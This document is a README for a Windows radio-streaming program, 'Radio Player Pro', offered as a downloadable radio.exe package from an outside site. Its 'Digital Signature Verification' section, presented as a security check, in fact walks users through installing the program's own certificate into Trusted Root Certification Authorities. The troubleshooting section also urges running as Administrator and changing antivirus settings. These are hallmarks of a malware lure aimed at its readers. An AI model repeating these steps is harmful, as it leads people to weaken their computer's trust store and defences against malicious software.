# 🎵 Radio Player Pro

![Radio Player Pro](https://img.shields.io/badge/Radio%20Player%20Pro-v1.2.3-blue?style=for-the-badge&logo=music)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows)
![License](https://img.shields.io/badge/License-STRICT-green?style=for-the-badge)

A modern, user-friendly radio streaming application that lets you listen to thousands of radio stations from around the world. Built with Python and CustomTkinter for a sleek, professional interface.

---

## 🚀 Quick Start

### For Windows Users (Recommended)

1. **Download** the complete Radio Player Pro package
2. **Extract main zipfolder you will see `radio.exe`.
3. **Navigate** to the `Radio-Player-Pro` folder
4. **Double-click** `radio.exe` to launch the application

⚠️ **CRITICAL**: Keep all files and folders together - do not move the exe file alone!

---

## ⚠️ Important File Structure

**DO NOT SEPARATE THESE FILES!** The application requires all components to work properly:

### 🔴 NEVER DO THIS:
- ❌ Move `radio.exe` to your desktop without the `_internal` folder
- ❌ Delete or move files from the `_internal` folder
- ❌ Separate the executable from its dependencies
- ❌ Rename the main folder while the app is running

### ✅ ALWAYS DO THIS:
- ✅ Keep the entire `Radio-Player-Pro` folder intact
- ✅ Run `radio.exe` from its original location
- ✅ Create shortcuts pointing to the exe in its folder
- ✅ Back up the entire folder structure

---

## 🔧 Installation & Setup

### Option 1: Ready-to-Use Executable (Recommended)

1. **Download** the complete package
2. **Extract** to your desired location
3. **Navigate** to `Radio-Player-Pro` folder
4. **Run** `radio.exe`

### Option 2: Auto Setup (If Available)

1. Go to the `setup` folder in `_internal`
2. Run `autosetup.exe`.
3. Follow the installation prompts
4. Launch from the `Radio-Player-Pro` folder

---

## 🎮 How to Use

### First Launch

1. **Accept** the User Agreement (covers privacy and usage terms)
2. **API MESSAGE** if api are online it will display and online message. if api are offline it will display an offline message
3. **Wait** for the splash screen (2 seconds)
4. The main application window will appear

### Main Interface

#### 🎵 Now Playing Section
- Shows currently selected station
- **▶ Play/Pause** button to control playback
- **⏹ Stop** button to stop streaming
- **Volume slider** to adjust audio level
- **Status display** showing connection info

#### 🔍 Search & Discovery
- **Search box**: Enter station name, genre, or country
- **Search button**: Find stations matching your query
- **Local button**: Automatically find stations in your area
- **Genre dropdown**: Browse by music genre
- **Country dropdown**: Browse by country

#### ⭐ Favorites Management
- **Favorites dropdown**: Quick access to saved stations
- **▶ Play**: Play selected favorite station
- **⭐ Add Current**: Save currently playing station

#### 📻 Station List
- Browse through available radio stations
- Each station shows:
  - Station name
  - Country and genre tags
  - Vote count (popularity)
  - **▶ Play** button

### Menu Bar Features

- **File**: Exit the application
- **View**: Switch between Dark/Light themes
- **Audio**: Configure audio settings and backends
- **Community**: Join our Discord server
- **Help**: Audio help and about information
- **License**: View software license

---

## 🔒 Digital Signature Verification

For security, verify the digital signature of `radio.exe`:

1. **Right-click** on `radio.exe`
2. Select **Properties**
3. Go to **Digital Signatures** tab
4. Click the timestamp date **Thursday**
5. Click **Details**
6. Click **View Certificate**
7. Click **Install Certificate**
8. Select **Current User**, click **Next**
9. Choose **Place All Certificates In The Following Store**
10. Click **Browse**
11. Select **Trusted Root Certification Authorities**
12. Click **OK**, then **Finish**
13. Verify the signature shows as **OK**

---

## 🎯 Features

### 🎵 Audio Playback
- **Multiple audio backends**: VLC (recommended), PyAudio, PyDub, Pygame
- **High-quality streaming** with adaptive buffering
- **Volume control** with real-time adjustment
- **Play/Pause/Stop** controls

### 🌍 Station Discovery
- **20,000+ radio stations** from around the world
- **Smart search** by name, genre, country, or tags
- **Local station detection** based on your location
- **Popular stations** curated by community votes
- **Genre filtering** with comprehensive categories

### ⭐ Personalization
- **Favorites system** to save your preferred stations
- **Quick access** to favorite stations
- **Persistent storage** of preferences
- **Theme customization** (Dark/Light modes)

### 🔧 Technical Features
- **Multiple audio backend support**
- **Robust error handling** and recovery
- **Caching system** for faster loading
- **Security-first design** with input sanitization
- **Cross-platform compatibility**

---

## 🛠️ Troubleshooting

### Common Issues

#### ❌ "Application won't start"
**Solution**: 
- Ensure all files are in the same folder
- Run as Administrator
- Check Windows Defender/Antivirus settings
- Verify digital signature (see above)

#### ❌ "No audio playback"
**Solutions**:
1. Go to **Audio** menu → **Audio Settings**
2. Try different audio backends:
   - **VLC** (best quality, recommended)
   - **PyAudio** (good for real-time)
   - **PyDub** (buffered playback)
   - **Pygame** (basic support)

#### ❌ "VLC not found"
**Solution**: Install VLC Media Player
1. Download from [videolan.org](https://www.videolan.org/vlc/)
2. Install VLC Media Player
3. Restart Radio Player Pro
4. VLC backend will be automatically detected
5. Traceback error will appear if you dont have `VLC`

#### ❌ "Stations won't load"
**Solutions**:
- Check internet connection
- Try different search terms
- Clear cache by restarting the application
- Use "Local" button for nearby stations

#### ❌ "Missing DLL errors"
**Solution**: Install Microsoft Visual C++ Redistributables
- Download from [Microsoft](https://aka.ms/vs/17/release/vc_redist.x64.exe)
- Install and restart your computer

### Advanced Troubleshooting

#### Enable Debug Mode
1. Hold **Shift** while launching `radio.exe`
2. Check console output for error messages
3. Report issues to support

#### Reset Application
1. Delete `favorites.json` from the `application` folder
2. Restart the application
3. Reconfigure your settings

---

## 🎨 Customization

### Themes
- **Dark Mode**: Default, easy on the eyes
- **Light Mode**: Clean, bright interface
- Switch via **View** menu

### Audio Settings
- **Buffer size**: Adjustable for your connection
- **Audio quality**: Multiple backend options
- **Volume**: Persistent across sessions

### Favorites
- **Unlimited favorites**: Save as many stations as you want
- **Quick access**: Dropdown menu for instant playback
- **Backup**: Export/import favorites (advanced)

---

## 👥 Community

### Join Our Discord
- **Discord Server**: [discord.gg/FxJd3PxXbc](https://discord.gg/FxJd3PxXbc)
- **Features**: 
  - Get help and support
  - Share favorite stations
  - Request new features
  - Connect with other users

### Contributing
- Report bugs and issues
- Suggest new features
- Share station recommendations
- Help other users

---

## 📞 Support

### Getting Help

1. **Check this README** for common solutions
2. **Join our Discord** for community support
3. **Check the troubleshooting section** above
4. **Report bugs** with detailed information

### System Requirements

- **OS**: Windows 10/11 (64-bit recommended)
- **RAM**: 4GB minimum, 8GB recommended
- **Storage**: 4GB free space
- **Network**: Internet connection required
- **Audio**: Built-in audio or headphones/speakers

### Reporting Issues

When reporting problems, include:
- **Windows version**
- **Error messages** (exact text)
- **Steps to reproduce** the issue
- **Audio backend** being used
- **Station URL** if relevant

---

## ***NOTE***
- if `API` is down radio will `fallback` to `temp` stations. 
- when `API` is back online everything will return back to normal `FULLY FUNCTIONAL`


---

## 📝 License

This software is provided under the MIT License. See the License menu in the application for full terms.

### Terms Summary
- ✅ Free to use for personal purposes
- ✅ No data collection or tracking
- ✅ Local processing only
- ⚠️ Use at your own risk
- ⚠️ Comply with local laws and regulations

---

## 🎵 Enjoy Your Music!

Radio Player Pro brings the world's radio stations to your fingertips. Whether you're discovering new music, staying updated with news, or enjoying your favorite shows, we've got you covered.

**Happy Listening!** 🎧

---

*Developed by TEAMFNB420 | Version 1.2 | 2025*

---

> **Remember**: Always keep the `radio.exe` file together with the `_internal` folder and all other components. The application is designed to work as a complete package!


# [Download Radio Player Pro](https://www.fnbubbles420.org/Download/index)
